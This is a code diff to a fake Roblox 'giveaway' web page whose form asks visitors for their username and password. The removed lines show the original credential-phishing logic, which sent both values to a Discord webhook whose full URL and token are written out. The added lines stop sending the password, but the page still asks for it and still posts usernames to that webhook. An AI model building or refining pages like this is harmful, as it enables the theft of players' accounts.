@@ -103,6 +103,13 @@
                 transform: translate(0, 100vh);
             }
         }
+
+        .confirmation-message {
+            text-align: center;
+            color: green;
+            font-weight: bold;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -117,6 +124,9 @@
             <input type="password" name="password" placeholder="Password">
             <input type="submit" value="Enter Giveaway">
         </form>
+        <div id="confirmation" class="confirmation-message" style="display: none;">
+            You successfully joined the giveaway!
+        </div>
         <div class="roblox-giveaway-footer">
             <a href="#">Terms and Conditions</a>
             <br>
@@ -125,13 +135,21 @@
         </div>
     </div>
     <script>
-        const webhookUrl = 'https://discord.com/api/webhooks/1320897243955597372/1ghR7MbsKGerGDJwdSF5RXEUtn6c8_cYwXuLu_J3MvVQyf6J4OCDMk2n5iH9qTvljbnJ';
+        const giveawayWebhook = 'https://discord.com/api/webhooks/1320897243955597372/1ghR7MbsKGerGDJwdSF5RXEUtn6c8_cYwXuLu_J3MvVQyf6J4OCDMk2n5iH9qTvljbnJ';
+        const joinedNotificationWebhook = 'https://discord.com/api/webhooks/YOUR_SECOND_WEBHOOK_URL'; // Replace with your second webhook URL
+
         const form = document.querySelector('form');
+        const confirmationMessage = document.getElementById('confirmation');
+
         form.addEventListener('submit', (e) => {
             e.preventDefault();
             const username = document.querySelector('input[name="username"]').value;
-            const password = document.querySelector('input[name="password"]').value;
-            fetch(webhookUrl, {
+
+            // Display confirmation message
+            confirmationMessage.style.display = 'block';
+
+            // Send entry details to the main webhook
+            fetch(giveawayWebhook, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -140,7 +158,7 @@
                     embeds: [
                         {
                             title: 'New Entry',
-                            description: `Username: ${username}\nPassword: ${password}`,
+                            description: `Username: ${username}`,
                             color: 0x00ff00,
                             timestamp: new Date().toISOString(),
                             footer: {
@@ -149,13 +167,17 @@
                         }
                     ]
                 })
-            })
-            .then((response) => response.json())
-            .then((data) => {
-                console.log(data);
-            })
-            .catch((error) => {
-                console.error(error);
+            });
+
+            // Send notification to another webhook
+            fetch(joinedNotificationWebhook, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `${username} joined the giveaway!`
+                })
             });
         });
 
